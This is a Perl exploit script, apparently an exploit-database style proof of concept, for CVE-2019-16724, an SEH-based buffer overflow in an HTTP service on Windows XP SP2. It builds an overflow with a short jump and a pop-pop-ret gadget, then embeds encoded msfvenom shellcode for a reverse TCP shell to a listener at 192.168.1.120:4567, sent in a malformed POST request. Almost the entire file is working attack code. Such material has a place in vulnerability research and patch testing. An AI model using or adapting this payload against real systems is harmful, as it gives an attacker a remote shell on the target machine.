#!/usr/bin/perl

# CVE: CVE-2019-16724 (https://nvd.nist.gov/vuln/detail/CVE-2019-16724)
# Method: SEH based buffer overflow
# Author: werebug (https://werebug.com)
# Tested on: Windows XP Service Pack 2

use strict;
use warnings;
use IO::Socket::INET;

my $host = "192.168.1.121";
my $port = 80;

# nseh offset at 1040
my $payload = "A" x 1040;
$payload .= "\xeb\x06\x90\x90";
# 0x74cc89c5 : pop ebp # pop ebx # ret 0x04 |  {PAGE_EXECUTE_READ} [oledlg.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v1.0 (C:\WINDOWS\system32\oledlg.dll)
$payload .= "\xc5\x89\xcc\x74";
$payload .= "\x90" x 16;
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f perl
$payload .= "\xda\xdc\xbb\xf1\xcc\x07\x9d\xd9\x74\x24\xf4\x58\x33\xc9" .
"\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x31\xc8\xe5\x68\x4d" .
"\x39\x6b\x92\xad\xba\x0c\x1a\x48\x8b\x0c\x78\x19\xbc\xbc" .
"\x0a\x4f\x31\x36\x5e\x7b\xc2\x3a\x77\x8c\x63\xf0\xa1\xa3" .
"\x74\xa9\x92\xa2\xf6\xb0\xc6\x04\xc6\x7a\x1b\x45\x0f\x66" .
"\xd6\x17\xd8\xec\x45\x87\x6d\xb8\x55\x2c\x3d\x2c\xde\xd1" .
"\xf6\x4f\xcf\x44\x8c\x09\xcf\x67\x41\x22\x46\x7f\x86\x0f" .
"\x10\xf4\x7c\xfb\xa3\xdc\x4c\x04\x0f\x21\x61\xf7\x51\x66" .
"\x46\xe8\x27\x9e\xb4\x95\x3f\x65\xc6\x41\xb5\x7d\x60\x01" .
"\x6d\x59\x90\xc6\xe8\x2a\x9e\xa3\x7f\x74\x83\x32\x53\x0f" .
"\xbf\xbf\x52\xdf\x49\xfb\x70\xfb\x12\x5f\x18\x5a\xff\x0e" .
"\x25\xbc\xa0\xef\x83\xb7\x4d\xfb\xb9\x9a\x19\xc8\xf3\x24" .
"\xda\x46\x83\x57\xe8\xc9\x3f\xff\x40\x81\x99\xf8\xa7\xb8" .
"\x5e\x96\x59\x43\x9f\xbf\x9d\x17\xcf\xd7\x34\x18\x84\x27" .
"\xb8\xcd\x0b\x77\x16\xbe\xeb\x27\xd6\x6e\x84\x2d\xd9\x51" .
"\xb4\x4e\x33\xfa\x5f\xb5\xd4\xc5\x08\xb4\x5c\xae\x4a\xb6" .
"\x8d\xf9\xc2\x50\xc7\x15\x83\xcb\x70\x8f\x8e\x87\xe1\x50" .
"\x05\xe2\x22\xda\xaa\x13\xec\x2b\xc6\x07\x99\xdb\x9d\x75" .
"\x0c\xe3\x0b\x11\xd2\x76\xd0\xe1\x9d\x6a\x4f\xb6\xca\x5d" .
"\x86\x52\xe7\xc4\x30\x40\xfa\x91\x7b\xc0\x21\x62\x85\xc9" .
"\xa4\xde\xa1\xd9\x70\xde\xed\x8d\x2c\x89\xbb\x7b\x8b\x63" .
"\x0a\xd5\x45\xdf\xc4\xb1\x10\x13\xd7\xc7\x1c\x7e\xa1\x27" .
"\xac\xd7\xf4\x58\x01\xb0\xf0\x21\x7f\x20\xfe\xf8\x3b\x40" .
"\x1d\x28\x36\xe9\xb8\xb9\xfb\x74\x3b\x14\x3f\x81\xb8\x9c" .
"\xc0\x76\xa0\xd5\xc5\x33\x66\x06\xb4\x2c\x03\x28\x6b\x4c" .
"\x06";
$payload .= "D" x (5000 - length($payload));

my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => 'tcp');
$sock->send("POST " . $payload . " HTTP/1.0\r\n\r\n");
close $sock;
